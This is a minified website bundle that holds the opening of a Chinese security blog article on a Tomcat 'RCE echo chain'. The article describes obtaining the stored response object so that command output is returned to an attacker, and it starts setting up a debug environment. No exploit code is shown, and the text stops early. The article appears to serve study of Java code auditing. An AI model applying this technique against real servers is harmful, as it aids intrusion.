"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[8816],{2853:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220210125302698-86fc08574385d8b00f2c5233f8a84311.png"},7778:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209145038406-66b93f44ee8b1a8afa4ca0a5275e71cc.png"},8551:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220210100818723-c18986948389e577d467d09c009bd107.png"},12025:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209130842383-ad6b7b67cfcf85c23f91db4bae8c7b72.png"},12049:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220210114240691-aaaa7ed3fcebfda87a4eee24f368cac3.png"},16407:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209171115093-8fccd4f294bbae810b462b2b9ace88be.png"},17700:(e,n,r)=>{r.d(n,{A:()=>s});const s="data:image/png;base64,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"},18601:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209160753875-ea13f0a94c1a7eb99f5d6f96df7307c1.png"},21129:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209171449493-168d648adf39dedd0c1d561fcd6e4e1a.png"},22297:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209165017817-a769a325a5dd0538d17be1ca8dfda4ef.png"},22597:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220209155109438-99fbc75e02de3b2fbad4960572ef9d36.png"},24356:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20220210131031927-26908ff57df3319594f43265250146c0.png"},28453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>o});var s=r(96540);const t={},c=s.createContext(t);function a(e){const n=s.useContext(c);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),s.createElement(c.Provider,{value:n},e.children)}},29722:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>d,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>s,toc:()=>i});const s=JSON.parse('{"id":"\u4ee3\u7801\u5ba1\u8ba1/Java\u5b89\u5168/RCE\u56de\u663e\u94fe/Tomcat\u56de\u663e\u94fe\uff08\u4e00\uff09","title":"Tomcat\u56de\u663e\u94fe\uff08\u4e00\uff09","description":"\u4ecb\u7ecd","source":"@site/docs/02.\u4ee3\u7801\u5ba1\u8ba1/01.Java\u5b89\u5168/04.RCE\u56de\u663e\u94fe/01.Tomcat\u56de\u663e\u94fe\uff08\u4e00\uff09.md","sourceDirName":"02.\u4ee3\u7801\u5ba1\u8ba1/01.Java\u5b89\u5168/04.RCE\u56de\u663e\u94fe","slug":"/\u4ee3\u7801\u5ba1\u8ba1/Java\u5b89\u5168/RCE\u56de\u663e\u94fe/Tomcat\u56de\u663e\u94fe\uff08\u4e00\uff09","permalink":"/docs/\u4ee3\u7801\u5ba1\u8ba1/Java\u5b89\u5168/RCE\u56de\u663e\u94fe/Tomcat\u56de\u663e\u94fe\uff08\u4e00\uff09","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts","lastUpdatedAt":1749874405000,"sidebarPosition":1,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"RCE\u56de\u663e\u94fe","permalink":"/docs/category/rce\u56de\u663e\u94fe"},"next":{"title":"\u5185\u5b58\u9a6c","permalink":"/docs/category/\u5185\u5b58\u9a6c"}}');var t=r(74848),c=r(28453);const a={},o=void 0,d={},i=[{value:"\u4ecb\u7ecd",id:"\u4ecb\u7ecd",level:2},{value:"\u4f18\u52bf",id:"\u4f18\u52bf",level:3},{value:"\u5b9e\u73b0\u624b\u6cd5",id:"\u5b9e\u73b0\u624b\u6cd5",level:3},{value:"\u5feb\u901f\u642d\u5efatomcat\u8c03\u8bd5\u73af\u5883",id:"\u5feb\u901f\u642d\u5efatomcat\u8c03\u8bd5\u73af\u5883",level:2},{value:"\u521b\u5efamaven\u9879\u76ee",id:"\u521b\u5efamaven\u9879\u76ee",level:3},{value:"\u4fee\u6539pom.xml",id:"\u4fee\u6539pomxml",level:3},{value:"\u521b\u5efaJava\u4ee3\u7801\u6587\u4ef6\u5939",id:"\u521b\u5efajava\u4ee3\u7801\u6587\u4ef6\u5939",level:3},{value:"\u521b\u5efa\u542f\u52a8\u7c7b",id:"\u521b\u5efa\u542f\u52a8\u7c7b",level:3},{value:"\u521b\u5efaservlet",id:"\u521b\u5efaservlet",level:3},{value:"servlet\u8fc7\u7a0b\u5206\u6790",id:"servlet\u8fc7\u7a0b\u5206\u6790",level:2},{value:"\u5229\u7528\u94fe\u6316\u6398",id:"\u5229\u7528\u94fe\u6316\u6398",level:2},{value:"response\u83b7\u53d6",id:"response\u83b7\u53d6",level:3},{value:"Http11Processor\u7c7b\u76f8\u5173",id:"http11processor\u7c7b\u76f8\u5173",level:3},{value:"\u83b7\u53d6global",id:"\u83b7\u53d6global",level:4},{value:"global\u94fe\u8def\u4ee3\u7801",id:"global\u94fe\u8def\u4ee3\u7801",level:4},{value:"\u8ddf\u8e2a<code>Registry.registerComponent()</code>",id:"\u8ddf\u8e2aregistryregistercomponent",level:4},{value:"MBeanServer\u94fe\u8def\u4ee3\u7801",id:"mbeanserver\u94fe\u8def\u4ee3\u7801",level:4},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:2},{value:"\u53c2\u8003",id:"\u53c2\u8003",level:2}];function l(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",h4:"h4",hr:"hr",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h2,{id:"\u4ecb\u7ecd",children:"\u4ecb\u7ecd"}),"\n",(0,t.jsx)(n.p,{children:"2020\u5e743\u6708\u957f\u4eadLitch1\u5e08\u5085\u627e\u5230\u7684\u4e00\u79cd\u57fa\u4e8e\u5168\u5c40\u50a8\u5b58\u7684\u65b0\u601d\u8def\uff0c\u5bfb\u627e\u5728Tomcat\u5904\u7406Filter\u548cServlet\u4e4b\u524d\u6709\u6ca1\u6709\u5b58\u50a8response\u53d8\u91cf\u7684\u5bf9\u8c61\u3002\u6574\u4e2a\u8fc7\u7a0b\u5206\u6790\u4e0b\u6765\u5c31\u50cf\u662f\u5728\u6784\u9020\u8c03\u7528\u94fe\uff0c\u4e00\u73af\u6263\u4e00\u73af\uff0c\u76f4\u5230\u627e\u5230\u4e86\u90a3\u4e2a\u9759\u6001\u53d8\u91cf\u6216\u8005\u662f\u90a3\u4e2a\u5df2\u7ecf\u521b\u5efa\u8fc7\u7684\u5bf9\u8c61\u3002"}),"\n",(0,t.jsx)(n.h3,{id:"\u4f18\u52bf",children:"\u4f18\u52bf"}),"\n",(0,t.jsx)(n.p,{children:"\u5229\u7528\u4e2d\u95f4\u4ef6\u6765\u5b9e\u73b0\u56de\u663e\uff0c\u53ef\u4ee5\u8de8\u5e73\u53f0\u901a\u7528\uff0c\u53ea\u8981\u4f7f\u7528\u4e86\u76f8\u5173\u7684\u7ec4\u4ef6\u5c31\u53ef\u4ee5\u8fbe\u5230\u56de\u663e\u7684\u76ee\u7684"}),"\n",(0,t.jsx)(n.h3,{id:"\u5b9e\u73b0\u624b\u6cd5",children:"\u5b9e\u73b0\u624b\u6cd5"}),"\n",(0,t.jsxs)(n.p,{children:["\u4e2a\u4eba\u611f\u89c9\u548c\u5185\u5b58\u9a6c\u8f93\u51fa\u7684\u65b9\u6cd5\u7c7b\u4f3c\uff0c\u8981\u60f3\u63a7\u5236\u8f93\u51fa\uff0c\u90a3\u4e48\u5c31\u8981\u83b7\u53d6\u5230",(0,t.jsx)(n.code,{children:"response"}),"\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u5b9a\u5236\u5316\u8c03\u7528\uff0c\u5b9e\u73b0\u5185\u5bb9\u8f93\u51fa"]}),"\n",(0,t.jsx)(n.h2,{id:"\u5feb\u901f\u642d\u5efatomcat\u8c03\u8bd5\u73af\u5883",children:"\u5feb\u901f\u642d\u5efatomcat\u8c03\u8bd5\u73af\u5883"}),"\n",(0,t.jsxs)(n.p,{children:["\u4e4b\u524d\u5728\u5b66\u4e60EL\u8868\u8fbe\u5f0f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u4e86IDEA\u4e00\u79cd",(0,t.jsx)(n.a,{href:"/docs/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F#%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAtomcat%E7%8E%AF%E5%A2%83",children:"\u7ed3\u5408\u672c\u5730tomcat\u670d\u52a1\u5668\u642d\u5efa\u73af\u5883"}),"\u7684\u65b9\u6cd5\uff1b"]}),"\n",(0,t.jsx)(n.p,{children:"\u8fd9\u6b21\u6211\u4eec\u4f7f\u7528\u53e6\u4e00\u79cd\u5185\u7f6eTomcat\u7684\u65b9\u6cd5\uff0c\u6765\u65b9\u4fbf\u6211\u4eec\u8c03\u8bd5tomcat"}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.p,{children:"